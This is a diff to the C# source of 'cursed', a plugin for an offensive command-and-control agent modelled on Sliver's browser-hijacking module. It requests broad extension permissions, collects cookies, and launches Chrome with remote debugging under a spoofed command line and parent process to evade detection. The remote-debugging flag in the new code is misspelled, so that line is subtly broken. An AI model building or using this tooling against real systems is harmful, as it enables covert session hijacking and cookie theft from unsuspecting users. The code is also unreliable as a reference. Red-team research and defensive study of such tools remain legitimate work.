@@ -13,15 +13,17 @@ namespace Agent
         //Based on the code in sliver: https://github.com/BishopFox/sliver/blob/master/client/overlord/overlord.go
         public string Name => "cursed";
         private IMessageManager messageManager { get; set; }
+        private ISpawner spawner { get; set; }
         private readonly List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking" };
         private readonly List<string> alt_permissions = new List<string> { "http://*/*", "https://*/*", "webRequest", "webRequestBlocking" };
         private Dictionary<string, string> cookiesOut = new Dictionary<string, string>();
-        private Config config { get; set; }
+        private CursedConfig config { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
-            this.config = new Config();
+            this.config = new CursedConfig();
             this.messageManager = messageManager;
+            this.spawner = spawner;
         }
         public async Task Execute(ServerJob job)
         {
@@ -319,7 +321,7 @@ namespace Agent
                         return;
                     }
 
-                    if (!SpawnElectron(inputParts[1]))
+                    if (!await SpawnElectron(inputParts[1], message.task_id))
                     {
                         ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
                         return;
@@ -327,7 +329,7 @@ namespace Agent
                     ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
                     break;
                 case "exit":
-                    this.config = new Config();
+                    this.config = new CursedConfig();
                     await this.messageManager.AddResponse(new InteractMessage()
                     {
                         task_id = message.task_id,
@@ -346,20 +348,35 @@ namespace Agent
 
             }
         }
-        private bool SpawnElectron(string choice)
+        private async Task<bool> SpawnElectron(string choice, string task_id)
         {
+            string executable_path = string.Empty;
             switch (choice.ToLower())
             {
                 case "chrome":
-                    ChromeSpawner cs = new ChromeSpawner(this.config);
-                    cs.Spawn();
+                    executable_path = ChromeFinder.FindChromePath();
                     break;
                 case "edge":
                     break;
                 default:
                     return false;
             }
-            return true;
+
+            string spoofedcmdline = string.Empty;
+            if (!string.IsNullOrEmpty(this.config.cmdline))
+            {
+                spoofedcmdline = $"{executable_path} {this.config.cmdline}";
+            }
+
+            SpawnOptions opts = new SpawnOptions()
+            {
+                task_id = task_id,
+                commandline = $"{executable_path} --remote-debuggin-port={this.config.debug_port}",
+                spoofedcommandline = spoofedcmdline,
+                output = false,
+                parent = this.config.parent
+            };
+            return await spawner.Spawn(opts);
         }
         private async Task<bool> Cursed(string choice, string task_id)
         {
@@ -373,7 +390,6 @@ namespace Agent
             {
                 this.config.payload = this.config.GetDefaultPayload();
             }
-
 
             switch (choice.ToLower())
             {
